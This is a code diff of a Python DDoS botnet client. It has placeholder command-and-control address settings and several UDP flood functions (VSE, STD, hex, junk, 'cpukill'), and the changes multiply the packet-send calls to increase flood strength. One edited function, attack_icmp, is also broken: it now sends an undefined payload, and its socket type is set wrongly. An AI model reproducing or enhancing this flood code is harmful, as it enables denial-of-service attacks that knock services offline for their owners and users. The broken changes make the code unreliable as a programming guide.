@@ -3,8 +3,8 @@ import threading
 import time
 import random
 
-C2_ADDRESS  = 'IPHERE'
-C2_PORT     = 'PORTHERE'
+C2_ADDRESS  = "IPHERE"
+C2_PORT     = PORTHERE
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -1049,11 +1049,21 @@ def attack_vse(ip, port, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
 
 def attack_std(ip, port, secs):
     payload = b'\x73\x74\x64\x00\x00\x00\x00\x00\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00'
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
 def attack_icmp(ip, port, secs, size):
@@ -1061,12 +1071,20 @@ def attack_icmp(ip, port, secs, size):
         s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
-        s.sendto(data, (ip, dport))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
 
 def attack_hex(ip, port, secs):
     payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
@@ -1080,11 +1098,17 @@ def attack_cpukill(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
 def attack_http(ip, secs):
